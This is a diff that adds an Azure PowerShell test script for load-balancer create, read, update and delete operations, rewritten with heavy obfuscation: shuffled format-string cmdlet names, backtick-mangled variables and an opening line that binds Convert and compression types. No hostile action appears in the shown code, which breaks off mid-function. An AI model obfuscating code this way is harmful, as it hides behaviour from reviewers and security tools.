@@ -1,0 +1,1933 @@
+sET-ITeM ("{2}{3}{0}{4}{1}" -f'0','D3','vARiAbl','E:','2') ([TYpE]("{1}{0}"-f'OnVert','c')  )  ;SEt-ItEm ("{4}{3}{1}{2}{0}" -f '7','l','E:Ezpv2','AriAB','v') ( [tYpe]("{3}{8}{6}{0}{1}{5}{7}{4}{2}"-f 'IoN','.COmpreSSi','De','iO.','O','O','mPresS','nM','CO')) ; 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function ChecK-c`m`dLetrETuRn`TY`pE
+{
+    param(${cm`dlEt`Name}, ${cMD`lEt`ReTURN})
+
+    ${c`m`dLeTDaTa} = &("{2}{0}{1}" -f '-Co','mmand','Get') ${cmDLET`Na`Me};
+    &("{3}{1}{4}{2}{0}"-f'otNull','sse','-N','A','rt') ${cMdlet`D`AtA};
+    [array]${cmDlETRe`Tu`R`NtyPes} = ${c`m`DLeTD`AtA}."OUtPu`T`TYPE"."NA`ME" | &("{2}{3}{1}{0}"-f'ct','e','Fo','reach-Obj') { return (${_} -replace ("{3}{2}{0}{1}{5}{9}{8}{4}{6}{7}" -f 's','oft.Azu','cro','Mi','ork.Mo','re.Comma','dels','.','w','nds.Net'),"") };
+    [array]${C`m`dletreT`Ur`N`TyPEs} = ${CMdLetR`EtU`RN`T`ypeS} | &("{1}{3}{4}{0}{2}"-f 'jec','F','t','o','reach-Ob') { return (${_} -replace ("{0}{2}{1}" -f 'Sy','m.','ste'),"") };
+    ${r`EA`lREt`UR`NtYpe} = ${cM`DLE`TRE`TURN}.("{0}{2}{1}"-f 'G','tType','e').Invoke()."na`ME" -replace ("{12}{8}{9}{10}{1}{6}{3}{4}{0}{7}{11}{5}{2}" -f'M','Co','.','ands.Ne','twork.','s','mm','ode','croso','ft.','Azure.','l','Mi'),"";
+    return ${CMD`l`etre`T`URntypEs} -contains ${REaLRe`Tu`Rnt`Y`pE};
+}
+
+
+function tEST-lOAD`BaLAnce`RC`RuDMini`M`Alp`A`RA`me`TErS
+{
+    
+    ${r`gnAmE} = &("{4}{0}{3}{1}{2}" -f 'et-Re','a','me','sourceGroupN','G');
+    ${RGLOC`At`ioN} = &("{4}{2}{1}{3}{0}"-f'on','derLoca','ovi','ti','Get-Pr') ("{3}{0}{4}{1}{5}{2}"-f 'sourc','anage','nt','Re','eM','me');
+    ${rN`A`me} = &("{3}{1}{4}{2}{0}" -f'ceName','et-R','sour','G','e');
+    ${LOC`At`ION} = &("{0}{5}{4}{1}{3}{2}"-f 'Get-Provi','o','ion','cat','rL','de') ("{2}{1}{3}{5}{0}{4}" -f 'er','etw','Microsoft.N','ork/loa','s','dBalanc');
+    
+    ${PublIcIP`AD`d`REssnaME} = ("{3}{2}{4}{0}{5}{1}" -f 'res','e','icIP','Publ','Add','sNam');
+    ${PUbLIcIp`Ad`dreSsal`LO`C`A`T`I`oNMe`THod} = ("{1}{0}" -f'tic','Sta');
+    ${f`ROnTendipConfIguRA`T`io`NnaMe} = ("{2}{1}{0}{4}{3}{5}" -f'figurat','rontendIPCon','F','nNa','io','me');
+    ${BAc`Ke`NdAddResspO`oLN`Ame} = ("{6}{3}{0}{2}{5}{1}{4}"-f 'ndA','N','ddre','cke','ame','ssPool','Ba');
+    ${PROb`e`NaMe} = ("{2}{0}{1}" -f'Nam','e','Probe');
+    ${ProbE`p`ort} = 2424;
+    ${p`ROBEINt`E`RVA`li`Nsec`oNds} = 6;
+    ${Pro`B`e`prO`BecouNt} = 4;
+    ${In`BO`U`NdNa`TpOoL`NA`me} = ("{4}{2}{0}{1}{3}"-f 'P','oolNa','nboundNat','me','I');
+    ${iNb`OUNdNaTPO`ol`Pro`To`cOL} = "Udp";
+    ${In`BOu`NDN`AtPOol`FrOnteNdpor`T`RANgESTArT} = 555;
+    ${INboU`NDnAtPOolFRO`N`Te`N`dpOR`Tra`NGee`Nd} = 999;
+    ${IN`BoUNDN`A`Tp`oO`LBAcKenDpo`Rt} = 987;
+
+    try
+    {
+        ${Res`OU`RCe`gro`Up} = &("{3}{2}{0}{1}"-f 'rceG','roup','-AzResou','New') -Name ${r`gna`Me} -Location ${RglO`CATI`oN};
+
+        
+        ${pUB`lI`CipAd`drE`Ss} = &("{0}{4}{3}{1}{2}{5}" -f'Ne','u','blicIPAddres','zP','w-A','s') -ResourceGroupName ${RgNa`ME} -Location ${L`oC`A`TiON} -Name ${p`U`BLicI`p`ADDrESs`NAME} -AllocationMethod ${p`U`B`lIci`Padd`RESsalLOcA`TioNMETh`oD};
+        ${FrOnTENDipc`oN`F`IGUR`AT`i`On} = &("{4}{5}{2}{7}{8}{6}{1}{0}{3}" -f'endIpCo','rFront','Az','nfig','New','-','ce','Lo','adBalan') -Name ${fRoN`TEn`D`iPcONFI`GuRaTioN`NAMe} -PublicIpAddress ${p`Ubl`IC`IpadDResS};
+        ${BACKEN`DAD`DRE`Sspool} = &("{5}{3}{8}{6}{0}{4}{10}{2}{1}{7}{9}"-f 'o','endAddr','rBack','w-A','a','Ne','L','essPool','z','Config','dBalance') -Name ${bacK`End`AddreSSPo`olNA`me};
+        ${p`RoBE} = &("{5}{0}{6}{1}{3}{4}{8}{7}{2}"-f 'e','-AzLoad','Config','Ba','lancer','N','w','robe','P') -Name ${prob`E`Name} -Port ${P`RO`BEPORt} -IntervalInSeconds ${PrOBEINT`ERVAlinSe`co`Nds} -ProbeCount ${P`RoBe`PRo`Beco`U`Nt};
+        ${INb`oUnDn`At`pOOL} = &("{3}{2}{8}{1}{7}{5}{4}{0}{6}"-f 'und','ance','oadB','New-AzL','o','Inb','NatPoolConfig','r','al') -Name ${in`BouND`NA`TpOOl`Na`Me} -FrontendIpConfiguration ${frO`NTen`diPCoNFIGurA`T`iON} -Protocol ${InB`OU`NdNatPOOLPr`otoC`OL} -FrontendPortRangeStart ${Inb`OuNdNAt`P`OOLf`ROnt`ENdPOrTR`AnG`e`s`TA`Rt} -FrontendPortRangeEnd ${iNbou`Ndn`At`POO`l`FRONtEn`dP`o`R`TRa`NgeENd} -BackendPort ${iN`BO`UN`DnAt`p`OO`LBA`CkEnDP`oRt};
+
+        
+        ${vloadB`AlanC`ER} = &("{3}{0}{2}{1}"-f 'ew','dBalancer','-AzLoa','N') -ResourceGroupName ${RGn`A`me} -Name ${rNA`me} -Location ${LOc`A`TI`On} -FrontendIpConfiguration ${fRoNt`En`DIpc`O`Nf`iGurat`ION} -BackendAddressPool ${B`AcKEndaD`DREs`spool} -Probe ${P`R`OBE} -InboundNatPool ${IN`BO`UnDnAtp`o`OL};
+        &("{1}{0}{4}{3}{2}"-f 'sert-N','As','ll','Nu','ot') ${Vl`oAD`BA`lAncER};
+        &("{1}{2}{0}"-f'rt-True','Ass','e') { &("{0}{1}{4}{6}{2}{5}{3}"-f'Check-C','md','nT','e','le','yp','tRetur') ("{1}{2}{0}{3}"-f'zLoadBala','New-','A','ncer') ${vlO`AdBalA`N`CeR} };
+        &("{2}{1}{3}{4}{0}" -f 'ull','-No','Assert','t','N') ${VLoAD`BA`la`NCer}."FROnTeNdipc`OnFiG`UR`A`TIoNS";
+        &("{2}{3}{1}{0}" -f '-True','ert','A','ss') { ${v`l`oaDBaLA`N`cer}."f`RoN`TENdIpCON`Fi`guRATIons"."l`En`Gth" -gt 0 };
+        &("{1}{2}{3}{0}{4}" -f '-Not','As','se','rt','Null') ${v`lOaD`BALanC`eR}."Ba`cke`N`DA`dDrE`ss`POolS";
+        &("{1}{0}{2}"-f 'ssert-Tru','A','e') { ${v`l`o`ADBaL`ANCer}."bAc`KENdAD`dR`E`ssPooLs"."len`gTh" -gt 0 };
+        &("{1}{2}{0}" -f 'ert-NotNull','As','s') ${V`lO`A`dBaL`Ancer}."p`RobEs";
+        &("{2}{3}{0}{1}"-f 'ser','t-True','A','s') { ${v`loADB`ALanCeR}."pR`oBeS"."L`EN`gTH" -gt 0 };
+        &("{0}{3}{2}{1}{4}" -f'Ass','ul','NotN','ert-','l') ${Vl`O`AD`BaLANceR}."IN`BOUn`DNaTp`OOlS";
+        &("{2}{0}{1}" -f'ru','e','Assert-T') { ${vlo`ADBaLaN`cER}."INbo`UNDnaTPO`O`lS"."l`ENGth" -gt 0 };
+        &("{4}{3}{1}{2}{0}"-f 'al','Eq','u','ssert-Are','A') ${rna`Me} ${vLo`ADB`A`LANcEr}."Na`mE";
+
+        
+        ${VLOa`d`BalAn`Cer} = &("{3}{4}{1}{0}{5}{2}" -f'LoadB','z','r','Get','-A','alance') -ResourceGroupName ${r`gnA`me} -Name ${R`NAme};
+        &("{3}{4}{0}{2}{1}"-f 'o','ull','tN','Asse','rt-N') ${Vlo`Ad`BAl`A`NcER};
+        &("{1}{0}{2}" -f 'ert-Tr','Ass','ue') { &("{1}{3}{4}{2}{0}"-f 'pe','Check-Cm','Ty','dletRetur','n') ("{4}{1}{3}{0}{2}" -f 'oadB','et-Az','alancer','L','G') ${vL`oA`dB`AL`AncER} };
+        &("{0}{3}{2}{1}" -f'A','eEqual','r','ssert-A') ${RnA`ME} ${vLoAdbAl`AN`C`ER}."NA`mE";
+
+        
+        ${LIsTLo`Ad`BA`LaN`cEr} = &("{3}{0}{2}{1}"-f 't-AzLoa','cer','dBalan','Ge') -ResourceGroupName ${RgnA`mE};
+        &("{1}{3}{0}{2}"-f 'ert-NotNul','A','l','ss') (${Li`Stlo`A`db`AlANCeR} | &("{1}{3}{2}{0}"-f'Object','Wh','-','ere') { ${_}."R`esouR`cegrOu`p`NaMe" -eq ${rgnA`ME} -and ${_}."n`Ame" -eq ${R`NA`me} });
+
+        
+        ${LISTL`O`AdBa`LancER} = &("{2}{1}{0}{4}{3}"-f'o','AzL','Get-','cer','adBalan');
+        &("{2}{0}{1}{4}{3}"-f '-','N','Assert','ull','otN') (${listl`Oa`d`Balan`Cer} | &("{1}{0}{2}" -f 'e-Objec','Wher','t') { ${_}."re`souRcEgR`oU`PnamE" -eq ${R`GN`AMe} -and ${_}."NA`Me" -eq ${rNa`ME} });
+
+        
+        ${LI`s`TLoAD`BALancER} = &("{2}{0}{3}{1}" -f'et-AzL','ancer','G','oadBal') -ResourceGroupName "*";
+        &("{3}{2}{0}{1}" -f 's','ert-NotNull','s','A') (${lIS`Tlo`ADBa`LAncEr} | &("{2}{0}{3}{1}" -f 're','ject','Whe','-Ob') { ${_}."reSour`ce`grOup`Na`me" -eq ${rGna`Me} -and ${_}."nA`ME" -eq ${R`Name} });
+
+        
+        ${lis`TLoaDB`ALa`N`CeR} = &("{1}{3}{0}{2}" -f 'z','G','LoadBalancer','et-A') -Name "*";
+        &("{2}{1}{0}" -f'l','l','Assert-NotNu') (${LisTLOa`DbaL`AN`c`er} | &("{1}{2}{0}"-f 'Object','Wher','e-') { ${_}."rESO`Ur`c`eGROup`Name" -eq ${RgN`Ame} -and ${_}."N`Ame" -eq ${rnA`ME} });
+
+        
+        ${l`iS`TLOadbA`lanc`ER} = &("{0}{1}{2}{3}"-f'G','et-AzLoad','Balanc','er') -ResourceGroupName "*" -Name "*";
+        &("{0}{2}{1}{4}{3}"-f'A','t','ssert-No','ll','Nu') (${l`IStLOad`BaLANc`Er} | &("{0}{2}{1}"-f'Where','bject','-O') { ${_}."rEsoU`RCE`gROuP`Na`ME" -eq ${r`Gn`AME} -and ${_}."na`mE" -eq ${rN`AMe} });
+
+        
+        ${j`ob} = &("{3}{2}{1}{5}{4}{0}" -f'r','B','e-AzLoad','Remov','e','alanc') -ResourceGroupName ${r`GnA`me} -Name ${r`NamE} -PassThru -Force -AsJob;
+        ${j`oB} | &("{2}{1}{0}" -f 't-Job','i','Wa');
+        ${RemOv`eLOAd`Ba`L`An`c`er} = ${j`OB} | &("{1}{2}{0}"-f'Job','Rece','ive-');
+        &("{0}{2}{4}{3}{1}" -f 'As','eEqual','s','Ar','ert-') ${T`RUe} ${R`EMO`VEl`OADbaL`AncEr};
+
+        
+        &("{0}{4}{1}{2}{5}{3}"-f'As','r','t','Contains','se','-Throws') { &("{2}{3}{1}{0}"-f'lancer','zLoadBa','G','et-A') -ResourceGroupName ${R`GNaME} -Name ${rn`AMe} } ("{2}{0}{3}{1}"-f'ot ','ound','n','f');
+    }
+    finally
+    {
+        
+        &("{3}{0}{1}{2}" -f 'l','e','an-ResourceGroup','C') ${rGN`A`Me};
+    }
+}
+
+
+function TESt-Lo`AdbAla`NCerC`RU`d`A`LLpARAM`ETERS
+{
+    
+    ${RGN`AME} = &("{5}{2}{4}{6}{3}{1}{0}" -f 'e','pNam','t','rceGrou','-R','Ge','esou');
+    ${R`g`loCAt`ION} = &("{5}{1}{2}{0}{3}{4}"-f'Lo','t-Provi','der','c','ation','Ge') ("{3}{2}{0}{1}" -f 'rceManag','ement','u','Reso');
+    ${rNa`me} = &("{2}{1}{0}{3}" -f 'R','et-','G','esourceName');
+    ${LOC`AT`ION} = &("{1}{3}{0}{2}"-f 'oviderLocatio','Ge','n','t-Pr') ("{2}{3}{4}{8}{5}{6}{0}{1}{7}"-f'lance','r','Mic','rosoft','.Ne','oadB','a','s','twork/l');
+    
+    ${T`Ag} = @{("{0}{1}" -f'tag','1')=("{1}{0}" -f 'est','t')};
+    ${s`Ku} = ("{0}{1}" -f 'B','asic');
+    
+    ${Tag`s`ET} = @{("{1}{0}"-f'2','tag')=("{1}{0}{2}" -f't','tes','Set')};
+    
+    ${puBLIC`Ip`A`Dd`R`e`ssName} = ("{2}{3}{0}{1}{4}"-f'IPAddre','ssNa','Pub','lic','me');
+    ${P`UBl`Ic`iPaDDrE`S`SaLL`oCAt`ionm`Eth`od} = ("{1}{0}" -f 'atic','St');
+    ${FRoNtenDi`PC`oNFi`GURati`o`NnA`mE} = ("{3}{0}{4}{2}{1}" -f 'tendIPConfig','me','tionNa','Fron','ura');
+    ${B`A`cKeNdaDdrE`sS`po`O`LnaMe} = ("{5}{0}{4}{2}{6}{1}{3}"-f 'acke','oo','s','lName','ndAddre','B','sP');
+    ${pRobeN`A`Me} = ("{2}{1}{0}" -f 'eName','rob','P');
+    ${p`R`OBePOrT} = 2424;
+    ${pRo`BeI`NterVaLIns`ec`onDs} = 6;
+    ${pr`OBE`PRobECO`U`Nt} = 4;
+    ${inB`O`UNDnAt`P`ooL`NAMe} = ("{2}{1}{3}{0}" -f 'Name','o','InboundNatP','ol');
+    ${INb`OU`NdNaTp`O`olpro`TocOl} = "Udp";
+    ${i`NbO`UN`dNAtPoO`lF`RONTENdpOrTranGe`ST`A`Rt} = 555;
+    ${In`BO`UnDnA`T`p`ool`FROnTENdPOr`T`Ran`G`eeNd} = 999;
+    ${iNBOuNdnaT`P`ool`B`ACKEN`dP`O`Rt} = 987;
+
+    try
+    {
+        ${RESoUR`cEgro`UP} = &("{0}{3}{4}{2}{1}" -f'New-Az','rceGroup','u','R','eso') -Name ${RG`N`AME} -Location ${Rg`locat`ION};
+
+        
+        ${pu`B`l`IcIPa`dDRESS} = &("{1}{2}{4}{3}{0}{5}"-f're','New','-','ublicIPAdd','AzP','ss') -ResourceGroupName ${rG`NAMe} -Location ${LO`CA`TioN} -Name ${PUbLIcipAd`DRes`s`NamE} -AllocationMethod ${pubLIcIpa`dd`Re`S`SAL`LO`CaTI`O`NmE`Thod};
+        ${F`RO`NTEnDiPCOn`FIGuR`ATIoN} = &("{3}{7}{1}{8}{0}{6}{5}{2}{4}" -f'e','alan','nfi','New-','g','endIpCo','rFront','AzLoadB','c') -Name ${Fr`onTEND`IpCoNfiGur`At`IonNAMe} -PublicIpAddress ${puBLic`I`padDresS};
+        ${Ba`CKe`NDa`ddRe`ssPooL} = &("{6}{1}{3}{2}{7}{4}{0}{5}"-f 'kendAddressPoolConf','ew','LoadBalancer','-Az','c','ig','N','Ba') -Name ${ba`C`K`EnDaddR`ESsPo`OLNaME};
+        ${p`RobE} = &("{2}{4}{6}{1}{7}{8}{5}{0}{3}"-f'i','rPro','New-Az','g','LoadBalanc','nf','e','beC','o') -Name ${p`Ro`BEn`Ame} -Port ${p`R`oBEPORT} -IntervalInSeconds ${P`RObeINte`R`Va`lINS`eC`On`ds} -ProbeCount ${proBEp`ROB`E`c`OuNt};
+        ${inBouNd`NAtP`oOL} = &("{5}{8}{1}{9}{6}{3}{10}{7}{0}{4}{2}"-f 'lCo','AzL','ig','d','nf','New','lancerInboun','o','-','oadBa','NatPo') -Name ${InBO`UNdnatpo`olN`Ame} -FrontendIpConfiguration ${fRon`Ten`DIP`COnfiGU`Rati`On} -Protocol ${I`N`Bou`NDN`ATPool`P`RotOCol} -FrontendPortRangeStart ${InbOundnA`Tp`OOlFrONt`eNDPO`Rtran`g`estArT} -FrontendPortRangeEnd ${inbo`Un`dnaTPOOLFroNT`en`dP`ORtRanG`EE`ND} -BackendPort ${INb`oU`Nd`NatpOO`lBA`cKeND`pORT};
+
+        
+        ${v`L`o`AdbAlAncEr} = &("{0}{1}{3}{2}" -f 'N','ew-A','oadBalancer','zL') -ResourceGroupName ${Rgn`AMe} -Name ${R`N`AME} -Location ${LoCA`TI`On} -FrontendIpConfiguration ${FRo`NteNd`i`pc`o`Nf`IGurAtI`on} -BackendAddressPool ${bA`CkEN`dADDR`E`ss`pOOl} -Probe ${PrO`BE} -InboundNatPool ${inB`oUN`D`NAT`pool} -Tag ${t`AG} -Sku ${s`Ku};
+        &("{3}{1}{4}{2}{0}"-f 'l','rt','otNul','Asse','-N') ${vlO`A`dbal`A`Ncer};
+        &("{2}{3}{0}{1}"-f'-Tr','ue','Ass','ert') { &("{4}{1}{2}{0}{5}{6}{3}"-f 'letR','heck-Cm','d','ype','C','etur','nT') ("{3}{0}{2}{5}{4}{1}"-f 'w-Az','r','L','Ne','alance','oadB') ${vlOaD`BALaN`CEr} };
+        &("{3}{2}{1}{0}" -f 'Null','t-Not','r','Asse') ${V`lOa`dbalAN`c`Er}."f`ROnTe`N`DIP`Co`NFIgUrAti`ONs";
+        &("{2}{0}{1}{3}"-f'ser','t-Tr','As','ue') { ${VL`oadBalAN`CEr}."Fr`oNt`Endi`pCONFi`GURAtions"."L`E`NgTH" -gt 0 };
+        &("{0}{1}{2}"-f'Ass','ert','-NotNull') ${VloA`Dbal`AncEr}."BAcKe`ND`A`DdrEs`SPOols";
+        &("{3}{1}{2}{0}"-f'rue','t','-T','Asser') { ${v`lO`AdbALa`NceR}."bAC`KeND`AddRE`SSpO`OlS"."len`g`TH" -gt 0 };
+        &("{0}{3}{2}{1}"-f'A','-NotNull','t','sser') ${vl`OA`DB`Al`ANCer}."Pr`obeS";
+        &("{2}{0}{1}{3}" -f'ert-T','r','Ass','ue') { ${vlO`ADb`Al`AnCEr}."PrO`B`eS"."LENg`TH" -gt 0 };
+        &("{1}{0}{4}{3}{2}" -f 'sse','A','tNull','-No','rt') ${vloADB`Al`A`NcER}."iNb`Oun`dnaTP`OoLS";
+        &("{1}{2}{0}" -f 'rue','Assert','-T') { ${vlOadbA`l`AN`ceR}."InboUNDNaT`P`OO`LS"."lE`NGTh" -gt 0 };
+        &("{2}{4}{0}{3}{1}" -f'qu','l','Assert-Ar','a','eE') ${r`NAME} ${VL`OAd`BA`lAncEr}."n`AMe";
+        &("{3}{9}{7}{4}{1}{6}{8}{0}{5}{2}"-f'r','a','ies','A','reEqu','t','lObjec','sert-A','tPrope','s') ${t`AG} ${V`LO`ADBal`ANCeR}."t`AG";
+        &("{3}{1}{0}{2}"-f 'u','ssert-AreEq','al','A') ${s`KU} ${vL`oadb`Alanc`er}."s`kU"."n`Ame";
+
+        
+        ${VL`OA`DB`AlANCER} = &("{1}{3}{5}{2}{0}{4}"-f'adBalanc','Get','zLo','-','er','A') -ResourceGroupName ${RGNA`ME} -Name ${R`NA`ME};
+        &("{4}{1}{2}{0}{3}"-f 't','s','ser','-NotNull','A') ${v`loAdbalaN`C`Er};
+        &("{1}{0}{3}{2}" -f'ert','Ass','True','-') { &("{1}{2}{5}{0}{3}{4}" -f'Cmdlet','Ch','e','ReturnTy','pe','ck-') ("{2}{0}{3}{1}" -f'oa','alancer','Get-AzL','dB') ${vlOadbal`AN`CeR} };
+        &("{2}{1}{3}{0}" -f'eEqual','ser','As','t-Ar') ${r`Na`Me} ${vL`O`A`dBAlAn`CER}."n`AmE";
+        &("{2}{3}{4}{5}{1}{0}" -f's','rtie','A','ssert-AreEqu','alObject','Prope') ${T`Ag} ${v`L`oadBA`lANCEr}."T`Ag";
+        &("{3}{0}{2}{1}" -f't-','ual','AreEq','Asser') ${S`KU} ${VLOa`db`ALa`N`CER}."s`KU"."N`AmE";
+
+        
+        ${LI`ST`LoadbaL`ANcer} = &("{2}{4}{0}{5}{1}{3}" -f'L','an','G','cer','et-Az','oadBal') -ResourceGroupName ${RGn`Ame};
+        &("{0}{1}{2}"-f'Assert-N','otN','ull') (${LIStl`OA`dBa`lanC`ER} | &("{2}{3}{1}{0}" -f 'ct','e-Obje','Whe','r') { ${_}."rESO`URCe`g`RoUpName" -eq ${RgnA`me} -and ${_}."n`AmE" -eq ${Rn`AmE} });
+
+        
+        ${l`IS`TloAdba`lANc`eR} = &("{1}{0}{3}{2}"-f'a','Get-AzLo','lancer','dBa');
+        &("{2}{0}{1}{4}{3}"-f'sert','-NotNu','As','l','l') (${L`IstlOAD`Ba`l`Ancer} | &("{1}{0}{2}" -f'Ob','Where-','ject') { ${_}."reSOU`RcEG`RO`UPNAMe" -eq ${RG`NamE} -and ${_}."nA`Me" -eq ${r`Na`me} });
+
+        
+        ${LIS`TLOAd`B`ALAnC`Er} = &("{0}{2}{3}{4}{1}"-f 'Get-AzLo','er','adB','alan','c') -ResourceGroupName "*";
+        &("{2}{1}{0}" -f 'Null','Not','Assert-') (${lIsT`LOAdBaL`A`NC`Er} | &("{0}{2}{1}"-f'Where','Object','-') { ${_}."R`ESoURcEg`RoUpnA`Me" -eq ${RG`N`AmE} -and ${_}."N`AMe" -eq ${r`NAmE} });
+
+        
+        ${l`IsT`loaD`Ba`Lan`ceR} = &("{3}{1}{2}{0}"-f'cer','Loa','dBalan','Get-Az') -Name "*";
+        &("{1}{2}{0}{3}" -f'rt-Not','As','se','Null') (${l`i`stl`OADbALAnC`eR} | &("{2}{0}{1}{3}"-f'here-','Objec','W','t') { ${_}."REs`Ourc`eGRouPn`AMe" -eq ${r`gnAmE} -and ${_}."Na`Me" -eq ${r`Name} });
+
+        
+        ${Lis`TLO`AdB`A`LAn`Cer} = &("{0}{4}{3}{2}{1}" -f'Get-AzLo','er','lanc','a','adB') -ResourceGroupName "*" -Name "*";
+        &("{1}{3}{2}{0}" -f 'l','Ass','ul','ert-NotN') (${LisTLoA`d`BalAnC`ER} | &("{2}{0}{1}"-f 'Obje','ct','Where-') { ${_}."re`sOU`Rc`Eg`RoUPnamE" -eq ${rGN`A`me} -and ${_}."NA`me" -eq ${R`N`AmE} });
+
+        
+        ${VLoaDBa`lA`Nc`ER}."T`Ag" = ${Ta`gSeT};
+        ${vloA`D`BaLaN`C`er} = &("{3}{2}{4}{0}{1}"-f'n','cer','et-AzL','S','oadBala') -LoadBalancer ${v`LoAdB`Ala`Nc`ER};
+        &("{2}{1}{0}"-f 'ull','rt-NotN','Asse') ${v`loA`dBal`AncEr};
+        &("{0}{2}{1}"-f 'As','True','sert-') { &("{5}{3}{2}{0}{4}{1}" -f 'T','e','urn','t','yp','Check-CmdletRe') ("{3}{1}{2}{5}{0}{4}" -f 'oad','et','-','S','Balancer','AzL') ${v`lo`AdBa`l`AnCer} };
+        &("{0}{1}{3}{2}" -f'Assert-Ar','e','al','Equ') ${rn`A`ME} ${V`loa`Db`ALAnCer}."nA`mE";
+        &("{2}{7}{6}{0}{4}{5}{8}{3}{1}"-f 'qual','s','A','e','Obje','c','rt-AreE','sse','tProperti') ${T`A`GSeT} ${VLOAdbA`L`AN`c`ER}."t`AG";
+
+        
+        ${v`lo`AdbAl`AN`CEr} = &("{0}{2}{3}{4}{1}{5}"-f 'G','e','et-A','zLoadBa','lanc','r') -ResourceGroupName ${R`GN`AME} -Name ${rN`AMe};
+        &("{2}{1}{0}"-f'll','-NotNu','Assert') ${VLo`Adb`A`lAn`cEr};
+        &("{1}{2}{0}"-f'True','Ass','ert-') { &("{0}{2}{4}{1}{3}" -f 'C','nT','heck','ype','-CmdletRetur') ("{2}{1}{4}{0}{3}" -f'dBal','t-AzL','Ge','ancer','oa') ${VL`O`A`d`BAlANCEr} };
+        &("{0}{1}{2}"-f 'Assert-AreE','q','ual') ${R`Name} ${V`LoA`dba`l`AncER}."NA`Me";
+        &("{3}{6}{4}{5}{2}{1}{0}" -f 'rties','rope','ectP','Ass','-AreE','qualObj','ert') ${Ta`GseT} ${vL`OaDbaLa`Ncer}."T`Ag";
+
+        
+        ${l`i`StL`oaDBA`L`ANcer} = &("{1}{0}{3}{2}"-f 'et-','G','alancer','AzLoadB') -ResourceGroupName ${r`gNAme};
+        &("{1}{0}{2}"-f'sert-','As','NotNull') (${lI`stL`OAd`BaLAnC`eR} | &("{1}{2}{0}" -f 'bject','Wh','ere-O') { ${_}."RE`So`UrC`eGro`UPnAMe" -eq ${rG`NA`mE} -and ${_}."N`AmE" -eq ${R`NAMe} });
+
+        
+        ${lIs`TLoa`D`BALA`Ncer} = &("{3}{1}{2}{0}{4}" -f 'zLoadBalance','e','t-A','G','r');
+        &("{2}{3}{1}{0}" -f'Null','Not','Ass','ert-') (${lisTloadb`Al`An`c`Er} | &("{2}{3}{1}{0}" -f'bject','-O','W','here') { ${_}."re`SOurceg`R`OuP`NAmE" -eq ${RgN`AmE} -and ${_}."n`Ame" -eq ${R`N`AME} });
+
+        
+        ${liS`TLo`A`DBaL`An`ceR} = &("{3}{2}{1}{4}{0}{5}"-f 'la','L','-Az','Get','oadBa','ncer') -ResourceGroupName "*";
+        &("{1}{0}{4}{3}{2}"-f 'ert-','Ass','ll','u','NotN') (${L`I`ST`loA`DbALaNCEr} | &("{3}{0}{2}{1}" -f 'here-O','ect','bj','W') { ${_}."ResOu`RC`egRo`UpnaMe" -eq ${R`gN`AMe} -and ${_}."NA`ME" -eq ${R`NA`me} });
+
+        
+        ${LIsTL`o`AdBa`LANCer} = &("{4}{2}{0}{1}{3}" -f 'oadBala','nc','et-AzL','er','G') -Name "*";
+        &("{2}{1}{4}{0}{3}"-f'tN','s','As','ull','ert-No') (${liS`Tlo`A`DBAL`ANCer} | &("{1}{3}{0}{2}" -f 'b','Where','ject','-O') { ${_}."ResO`UR`cE`g`RoUpnaMe" -eq ${r`gN`Ame} -and ${_}."n`AME" -eq ${R`N`AMe} });
+
+        
+        ${lI`StloAD`BALAn`CER} = &("{2}{3}{1}{0}"-f'Balancer','d','G','et-AzLoa') -ResourceGroupName "*" -Name "*";
+        &("{2}{1}{0}{4}{3}"-f 't','er','Ass','NotNull','-') (${lIs`TlOadB`Al`A`Nc`Er} | &("{0}{2}{3}{1}" -f'Whe','ct','re-Ob','je') { ${_}."reS`OURc`eg`ROUpnAMe" -eq ${rGN`A`ME} -and ${_}."N`AmE" -eq ${R`NAMe} });
+
+        
+        ${j`OB} = &("{4}{3}{5}{2}{1}{0}"-f 'er','anc','adBal','v','Remo','e-AzLo') -ResourceGroupName ${rGN`Ame} -Name ${rn`AME} -PassThru -Force -AsJob;
+        ${j`ob} | &("{1}{0}"-f'it-Job','Wa');
+        ${REM`OveloADB`A`LANcer} = ${J`OB} | &("{1}{0}{2}" -f 'eive-J','Rec','ob');
+        &("{2}{3}{1}{0}" -f 'qual','E','A','ssert-Are') ${T`RuE} ${reM`OV`eLoA`dbaLA`Nc`eR};
+
+        
+        &("{3}{0}{1}{2}" -f'rows','Co','ntains','Assert-Th') { &("{0}{1}{2}{5}{3}{4}"-f 'Ge','t-','AzLo','alan','cer','adB') -ResourceGroupName ${r`gN`AmE} -Name ${RNA`ME} } ("{1}{2}{0}" -f'found','not',' ');
+
+        
+        &("{4}{2}{5}{1}{0}{3}"-f'ontai','ThrowsC','s','ns','As','ert-') { &("{1}{0}{3}{2}"-f'-AzLoad','Set','ancer','Bal') -LoadBalancer ${vlOa`dBA`L`AnC`ER} } ("{0}{1}"-f 'not fo','und');
+    }
+    finally
+    {
+        
+        &("{1}{4}{0}{3}{2}" -f 'r','C','roup','ceG','lean-Resou') ${rGN`AME};
+    }
+}
+
+
+function TEs`T-fr`onTe`Ndi`pCoNFiGu`RaTi`onCR`UdMini`Ma`lpaRAMet`eRS
+{
+    
+    ${Rg`NamE} = &("{1}{5}{0}{4}{2}{3}"-f 'pN','Ge','m','e','a','t-ResourceGrou');
+    ${rgl`o`CAti`ON} = &("{4}{3}{1}{0}{2}{5}"-f 'L','ider','ocat','ov','Get-Pr','ion') ("{1}{3}{2}{0}"-f 't','Res','n','ourceManageme');
+    ${r`Na`Me} = &("{4}{1}{0}{2}{3}"-f'Resou','et-','r','ceName','G');
+    ${rNAM`ea`dD} = "${rname}Add";
+    ${l`O`CAt`ion} = &("{4}{5}{1}{3}{2}{0}" -f'on','rovid','Locati','er','G','et-P') ("{0}{2}{1}{6}{4}{3}{5}" -f'Micr','s','o','ancer','ft.Network/loadBal','s','o') ("{0}{2}{1}"-f 'E','2','ast US ');
+    
+    ${S`U`BNetnAME} = ("{0}{1}{2}"-f 'Su','bnet','Name');
+    ${suBNeTaddRE`s`SPRE`FIX} = ("{1}{0}{2}" -f'0.1.0/2','10.','4');
+    ${ViRT`U`A`lNeTw`orKnAmE} = ("{0}{1}{2}{3}{4}"-f 'VirtualNe','tw','or','kNam','e');
+    ${vi`Rt`UAlneTWOR`K`A`d`dreSSpreFiX} = @(("{2}{3}{0}{1}"-f '.0.','0/8','10','.0'));
+
+    try
+    {
